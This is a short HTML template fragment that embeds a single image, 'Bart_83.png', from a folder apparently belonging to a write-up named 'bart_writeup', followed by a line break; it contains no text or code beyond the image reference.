<img src="{{ site.img_path }}/bart_writeup/Bart_83.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
